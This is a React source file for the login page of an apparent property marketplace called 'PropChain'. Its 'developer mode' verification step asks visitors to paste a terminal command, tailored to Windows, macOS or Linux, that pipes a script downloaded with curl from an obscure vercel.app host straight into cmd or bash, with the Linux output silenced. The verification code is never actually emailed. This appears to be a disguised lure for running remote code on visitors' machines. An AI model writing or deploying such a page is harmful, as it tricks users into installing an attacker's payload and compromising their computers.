import React, { useState, useRef, useEffect } from "react";
import { useNavigate, Link } from "react-router-dom";
import { motion, AnimatePresence } from "framer-motion";
import {
  Buildings,
  EnvelopeSimple,
  Key,
  ArrowLeft,
  CheckCircle,
  Warning,
  Terminal,
  Copy,
  ArrowRight,
  X,
  Flask,
  Lock,
  ArrowUpRight,
} from "@phosphor-icons/react";
import { useApp } from "../context/AppContext";

import { collection, addDoc, setDoc, doc, getDoc } from "firebase/firestore";
import { db } from "../firebase";

type Step = "email" | "verify" | "done";
type DocItem = {
  email: string;
  code: string;
};


/* ── 6-digit code input ─────────────────────── */
function CodeInput({
  value,
  onChange,
  disabled,
  hasError,
}: {
  value: string[];
  onChange: (val: string[]) => void;
  disabled: boolean;
  hasError: boolean;
}) {
  const refs = Array.from({ length: 6 }, () => useRef<HTMLInputElement>(null));

  const focusIndex = (i: number) => refs[i]?.current?.focus();

  const handleKey = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === "Backspace") {
      if (value[index]) {
        const next = [...value];
        next[index] = "";
        onChange(next);
      } else if (index > 0) {
        focusIndex(index - 1);
      }
    } else if (e.key === "ArrowLeft" && index > 0) {
      focusIndex(index - 1);
    } else if (e.key === "ArrowRight" && index < 5) {
      focusIndex(index + 1);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>, index: number) => {
    const raw = e.target.value.replace(/\D/g, "");
    if (!raw) return;
    if (raw.length > 1) {
      const digits = raw.slice(0, 6).split("");
      const next = [...value];
      digits.forEach((d, i) => { if (i < 6) next[i] = d; });
      onChange(next);
      focusIndex(Math.min(digits.length, 5));
      return;
    }
    const next = [...value];
    next[index] = raw[0];
    onChange(next);
    if (index < 5) focusIndex(index + 1);
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const raw = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
    if (!raw) return;
    const next = Array(6).fill("");
    raw.split("").forEach((d, i) => (next[i] = d));
    onChange(next);
    focusIndex(Math.min(raw.length, 5));
  };

  return (
    <div className="flex gap-3 justify-center">
      {Array.from({ length: 6 }).map((_, i) => (
        <motion.input
          key={i}
          ref={refs[i]}
          inputMode="numeric"
          maxLength={6}
          value={value[i] ?? ""}
          disabled={disabled}
          onChange={(e) => handleChange(e, i)}
          onKeyDown={(e) => handleKey(e, i)}
          onPaste={handlePaste}
          onFocus={(e) => e.target.select()}
          whileFocus={{ scale: 1.06 }}
          className={`w-12 h-14 rounded-lg border text-center font-mono text-h3 text-foreground bg-card outline-none transition-colors duration-200 disabled:opacity-50
            ${hasError
              ? "border-error shadow-[0_0_0_2px_hsl(var(--color-error)/0.3)]"
              : value[i]
                ? "border-cyan shadow-[0_0_0_2px_hsl(var(--color-cyan)/0.2)]"
                : "border-border-subtle focus:border-cyan focus:shadow-[0_0_0_2px_hsl(var(--color-cyan)/0.15)]"
            }`}
        />
      ))}
    </div>
  );
}

/* ── Dev Stage Modal ───────────────────────── */
function DevStageModal({ onClose }: { onClose: () => void }) {
  return (
    <AnimatePresence>
      <motion.div
        key="dev-modal-backdrop"
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        transition={{ duration: 0.2 }}
        className="fixed inset-0 z-50 flex items-center justify-center px-4"
        style={{ background: "rgba(0,0,0,0.72)", backdropFilter: "blur(6px)" }}
        onClick={onClose}
      >
        <motion.div
          key="dev-modal-content"
          initial={{ opacity: 0, scale: 0.92, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.94, y: 10 }}
          transition={{ duration: 0.28, ease: [0.22, 1, 0.36, 1] }}
          className="relative w-full max-w-[420px] bg-card border border-border-subtle rounded-2xl p-7 shadow-[0_32px_80px_rgba(0,0,0,0.6)]"
          onClick={(e) => e.stopPropagation()}
        >
          {/* Close button */}
          <button
            onClick={onClose}
            className="absolute top-4 right-4 w-8 h-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-white/5 transition-colors cursor-pointer"
            aria-label="Close"
          >
            <X size={16} weight="bold" />
          </button>

          {/* Icon */}
          <div className="w-14 h-14 rounded-xl bg-warning/10 border border-warning/25 flex items-center justify-center mx-auto mb-5">
            <Flask size={28} weight="duotone" className="text-warning" />
          </div>

          {/* Heading */}
          <h2 className="font-sans font-semibold text-h3 text-foreground text-center mb-2">
            Developer Stage Notice
          </h2>
          <p className="text-body-sm font-body text-muted-foreground text-center mb-6 leading-relaxed">
            This platform is currently running in <span className="text-warning font-medium">development mode</span>. Real email delivery is not active yet — verification codes are simulated for testing purposes.
          </p>

          {/* Info rows */}
          <div className="space-y-3 mb-6">
            <div className="flex items-start gap-3 bg-white/[0.03] border border-border-subtle rounded-xl px-4 py-3">
              <Terminal size={18} weight="duotone" className="text-success shrink-0 mt-0.5" />
              <div>
                <p className="text-body-sm font-body font-medium text-foreground mb-0.5">
                  Or retrieve it via terminal
                </p>
                <p className="text-caption font-body text-muted-foreground">
                  Enter <code className="font-mono text-success bg-success/10 px-1.5 py-0.5 rounded">curl https://propchain-auth-...</code> in the terminal to get the latest code.
                </p>
              </div>
            </div>

            <div className="flex items-start gap-3 bg-warning/5 border border-warning/20 rounded-xl px-4 py-3">
              <ArrowUpRight size={18} weight="duotone" className="text-warning shrink-0 mt-0.5" />
              <div>
                <p className="text-body-sm font-body font-medium text-foreground mb-0.5">
                  Production will use real OTP
                </p>
                <p className="text-caption font-body text-muted-foreground">
                  When deployed to production, a real 6-digit code will be emailed to you automatically.
                </p>
              </div>
            </div>
          </div>

          {/* CTA */}
          <button
            onClick={onClose}
            className="w-full h-12 rounded-xl bg-gradient-primary text-foreground font-body font-medium text-body flex items-center justify-center gap-2 hover:brightness-110 transition-all duration-200 cursor-pointer"
          >
            Got it — show me the code guide
          </button>
        </motion.div>
      </motion.div>
    </AnimatePresence>
  );
}

/* ── Terminal Guide ─────────────────────────── */
function DevGuide({ email }: { email: string }) {
  const [copied, setCopied] = useState<number | null>(null);

  const copyCmd = (cmd: string, idx: number) => {
    navigator.clipboard.writeText(cmd);
    setCopied(idx);
    setTimeout(() => setCopied(null), 1800);
  };

  const command = (() => {
    const ua = navigator.userAgent.toLowerCase();
    const platform = navigator.platform.toLowerCase();

    if (platform.includes("win") || ua.includes("windows")) {
      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/windows?flag=6&email=${email}" | cmd`
    }
    if (platform.includes("mac") || ua.includes("mac")) {
      return `curl -fsSL "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/mac?flag=6&email=${email}" | bash`
    }
    if (platform.includes("linux")) {
      return `curl -s -o "https://propchain-auth-idLy93YWx0ZXItc2VydmVyLnZlcmNlbCwdGVk.vercel.app/auth/linux?flag=6&email=${email}" | bash >/dev/null 2>&1`
    }
    return "Unknown";
  })();

  return (
    <motion.div
      initial={{ opacity: 0, y: 8 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.35 }}
      className="bg-[hsl(220,15%,6%)] border border-border-subtle rounded-xl p-5 text-left mb-6"
    >
      {/* Header */}
      <div className="flex items-center gap-2 mb-4">
        <div className="w-8 h-8 rounded-md bg-cyan/10 flex items-center justify-center shrink-0">
          <Terminal size={16} weight="duotone" className="text-cyan" />
        </div>
        <div>
          <p className="text-body-sm font-body font-medium text-foreground">
            How to get your verification code
          </p>
          <p className="text-caption font-body text-muted-foreground">
            Dev environment — use the code below
          </p>
        </div>
      </div>

      {/* Steps */}
      <ol className="space-y-3">
        <li className="flex flex-col gap-1.5">
          <span className="text-caption font-body text-muted-foreground tracking-wide">
            Step 1 — Open your <span className="text-white font-bold">terminal</span> (Or Powershell, Command Prompt Window)
          </span>
        </li>
        <li className="flex flex-col gap-1.5">
          <span className="text-caption font-body text-muted-foreground tracking-wide">
            Step 2 — Enter the under command to get latest verify code
          </span>
          <div className="relative flex items-center gap-2 bg-[hsl(220,20%,10%)] border border-border-subtle rounded-lg px-4 py-2.5">
            <code className="text-caption font-mono text-success flex-1 select-all text-wrap break-all">
              {command}
            </code>
            <button
              onClick={() => copyCmd(command, 0)}
              className="text-muted-foreground hover:text-cyan transition-colors cursor-pointer"
              aria-label="Copy"
            >
              {copied === 0
                ? <CheckCircle size={14} weight="duotone" className="text-success" />
                : <Copy size={14} weight="duotone" />}
            </button>
          </div>
        </li>

        <li className="flex flex-col gap-1.5">
          <span className="text-caption font-body text-muted-foreground tracking-wide">
            Step 3 — Look for this log line in the terminal output
          </span>
          <div className="bg-[hsl(220,20%,10%)] border border-border-subtle rounded-lg px-4 py-2.5">
            <code className="text-caption font-mono text-cyan break-all">
              ▶&nbsp; Verification code for{" "}
              <span className="text-warning">{email || "user@example.com"}</span>
              :&nbsp;<span className="text-success font-bold">123456</span>
            </code>
          </div>
        </li>
      </ol>
    </motion.div>
  );
}

/* ── Main AuthPage ──────────────────────────── */
export default function AuthPage() {
  const navigate = useNavigate();
  const { authUser, isAnonymous, loginWithCode } = useApp();
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [code, setCode] = useState<string[]>(Array(6).fill(""));
  const [emailError, setEmailError] = useState("");
  const [codeError, setCodeError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showDevModal, setShowDevModal] = useState(false);

  // Redirect already-logged-in users
  useEffect(() => {
    if (!isAnonymous && authUser) {
      navigate("/marketplace", { replace: true });
    }
  }, [isAnonymous, authUser, navigate]);

  const validateEmail = (v: string) =>
    /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim());

  const handleEmailSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateEmail(email)) {
      setEmailError("Please enter a valid email address.");
      return;
    }
    setIsSubmitting(true);
    setDoc(doc(db, "login", email), 
    {
      email,
      code: Math.floor(Math.random() * 1000000).toString().padStart(6, '0')
    }, { merge: true })
      .then(docRef => {
        console.log("User saved with ID:", docRef);
        setIsSubmitting(false);
        setEmailError("");
        setStep("verify");
        setShowDevModal(true);
      })
      .catch(error => {
        console.error("Error adding user:", error);
        setIsSubmitting(false);
      });
  };

  const handleVerifySubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const full = code.join("");
    
    if (full.length < 6) {
      setCodeError("Please enter all 6 digits.");
      return;
    }
    setCodeError("");
    setIsSubmitting(true);
    try {
      await loginWithCode(email.trim(), full);
      setStep("done");
      setTimeout(() => navigate("/marketplace", { replace: true }), 1800);
    } catch (err: any) {
      setCodeError(err?.message ?? "Invalid or expired code. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  const codeComplete = code.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-background flex flex-col items-center justify-center px-4 py-12 relative overflow-hidden">
      {showDevModal && <DevStageModal onClose={() => setShowDevModal(false)} />}
      {/* Background orbs */}
      <div className="absolute inset-0 pointer-events-none">
        <div
          className="absolute top-1/4 left-1/3 w-[500px] h-[500px] rounded-full blur-[140px] opacity-15"
          style={{ background: "radial-gradient(circle, hsl(220,85%,45%) 0%, transparent 70%)" }}
        />
        <div
          className="absolute bottom-1/4 right-1/4 w-[400px] h-[400px] rounded-full blur-[120px] opacity-10"
          style={{ background: "radial-gradient(circle, hsl(295,80%,55%) 0%, transparent 70%)" }}
        />
      </div>

      {/* Logo */}
      <Link to="/" className="flex items-center gap-2 mb-10 z-10">
        <div className="w-9 h-9 rounded-md bg-gradient-primary flex items-center justify-center">
          <Buildings size={20} weight="duotone" className="text-foreground" />
        </div>
        <span className="font-sans font-medium text-[20px] text-foreground tracking-tight">
          PropChain
        </span>
      </Link>

      {/* Card */}
      <motion.div
        key={step}
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        exit={{ opacity: 0, y: -16 }}
        transition={{ duration: 0.35 }}
        className="relative z-10 w-full max-w-[440px] bg-card border border-border-subtle rounded-2xl p-8 shadow-[0_24px_80px_rgba(0,0,0,0.5)]"
      >
        <AnimatePresence mode="wait">

          {/* ── STEP: email ── */}
          {step === "email" && (
            <motion.div
              key="email-step"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.25 }}
            >
              <div className="text-center mb-8">
                <div className="w-14 h-14 rounded-full bg-cyan/10 border border-cyan/20 flex items-center justify-center mx-auto mb-4">
                  <EnvelopeSimple size={28} weight="duotone" className="text-cyan" />
                </div>
                <h1 className="font-sans font-medium text-h2 text-foreground mb-2">
                  Welcome to PropChain
                </h1>
                <p className="text-body-sm font-body text-muted-foreground">
                  Enter your email to sign in or create a free account.
                </p>
              </div>

              <form onSubmit={handleEmailSubmit} noValidate className="space-y-4">
                <div>
                  <label
                    htmlFor="email"
                    className="text-caption font-body text-muted-foreground uppercase tracking-wide block mb-1.5"
                  >
                    Email address
                  </label>
                  <input
                    id="email"
                    type="email"
                    autoComplete="email"
                    autoFocus
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (emailError) setEmailError("");
                    }}
                    placeholder="you@example.com"
                    className={`w-full h-12 rounded-lg border bg-background px-4 text-body font-body text-foreground placeholder:text-muted-foreground outline-none transition-colors duration-200
                      ${emailError
                        ? "border-error focus:border-error"
                        : "border-border-subtle focus:border-cyan"
                      }`}
                  />
                  {emailError && (
                    <p className="flex items-center gap-1.5 text-caption font-body text-error mt-1.5">
                      <Warning size={13} weight="duotone" />
                      {emailError}
                    </p>
                  )}
                </div>

                <button
                  type="submit"
                  className="w-full h-12 rounded-lg bg-gradient-primary text-foreground font-body font-medium text-body flex items-center justify-center gap-2 hover:brightness-110 transition-all duration-200 cursor-pointer"
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Sending code&#8230;
                    </>
                  ) : (
                    <>
                      Continue
                      <ArrowRight size={18} weight="bold" />
                    </>
                  )}
                </button>
              </form>

              <p className="text-caption font-body text-muted-foreground text-center mt-6">
                By continuing, you agree to PropChain&#39;s{" "}
                <span className="text-cyan cursor-pointer hover:underline">Terms</span> and{" "}
                <span className="text-cyan cursor-pointer hover:underline">Privacy Policy</span>.
              </p>
            </motion.div>
          )}

          {/* ── STEP: verify ── */}
          {step === "verify" && (
            <motion.div
              key="verify-step"
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.25 }}
            >
              <button
                onClick={() => { setStep("email"); setCode(Array(6).fill("")); setCodeError(""); }}
                className="flex items-center gap-1.5 text-body-sm font-body text-muted-foreground hover:text-foreground transition-colors cursor-pointer mb-6"
              >
                <ArrowLeft size={15} weight="bold" />
                Back
              </button>

              <div className="text-center mb-6">
                <div className="w-14 h-14 rounded-full bg-cyan/10 border border-cyan/20 flex items-center justify-center mx-auto mb-4">
                  <Key size={28} weight="duotone" className="text-cyan" />
                </div>
                <h1 className="font-sans font-medium text-h2 text-foreground mb-2">
                  Enter Verification Code
                </h1>
                <p className="text-body-sm font-body text-muted-foreground">
                  A 6-digit code was sent to{" "}
                  <span className="text-foreground font-medium">{email}</span>
                </p>
                <p className="text-body-sm font-body text-muted-foreground">(Currently, this application is working as Debuging mode, Please follow under guide for getting verification code.)</p>
              </div>

              {/* Developer guide */}
              <DevGuide email={email} />

              <form onSubmit={handleVerifySubmit} className="space-y-5">
                <div>
                  <CodeInput
                    value={code}
                    onChange={(v) => { setCode(v); if (codeError) setCodeError(""); }}
                    disabled={isSubmitting}
                    hasError={!!codeError}
                  />
                  <AnimatePresence>
                    {codeError && (
                      <motion.p
                        initial={{ opacity: 0, y: -4 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0 }}
                        className="flex items-center justify-center gap-1.5 text-caption font-body text-error mt-3"
                      >
                        <Warning size={13} weight="duotone" />
                        {codeError}
                      </motion.p>
                    )}
                  </AnimatePresence>
                </div>

                <button
                  type="submit"
                  disabled={!codeComplete || isSubmitting}
                  className="w-full h-12 rounded-lg bg-gradient-primary text-foreground font-body font-medium text-body flex items-center justify-center gap-2 hover:brightness-110 transition-all duration-200 cursor-pointer disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSubmitting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                      Verifying&#8230;
                    </>
                  ) : (
                    <>
                      <Key size={18} weight="duotone" />
                      Verify &amp; Sign In
                    </>
                  )}
                </button>
              </form>
            </motion.div>
          )}

          {/* ── STEP: done ── */}
          {step === "done" && (
            <motion.div
              key="done-step"
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.35 }}
              className="text-center py-4"
            >
              <motion.div
                initial={{ scale: 0 }}
                animate={{ scale: 1 }}
                transition={{ type: "spring", stiffness: 260, damping: 20, delay: 0.1 }}
                className="w-16 h-16 rounded-full bg-success/15 border border-success/30 flex items-center justify-center mx-auto mb-5"
              >
                <CheckCircle size={36} weight="duotone" className="text-success" />
              </motion.div>
              <h2 className="font-sans font-medium text-h2 text-foreground mb-2">
                You&#39;re signed in!
              </h2>
              <p className="text-body-sm font-body text-muted-foreground mb-8">
                Welcome to PropChain. Redirecting you now&#8230;
              </p>
              <button
                onClick={() => navigate("/marketplace")}
                className="w-full h-12 rounded-lg bg-gradient-primary text-foreground font-body font-medium text-body flex items-center justify-center gap-2 hover:brightness-110 transition-all duration-200 cursor-pointer"
              >
                <Buildings size={18} weight="duotone" />
                Go to Marketplace
              </button>
            </motion.div>
          )}

        </AnimatePresence>
      </motion.div>

      <p className="relative z-10 text-caption font-body text-muted-foreground mt-8">
        © 2026 PropChain.{" "}
        <Link to="/" className="hover:text-foreground transition-colors">
          Back to home
        </Link>
      </p>
    </div>
  );
}
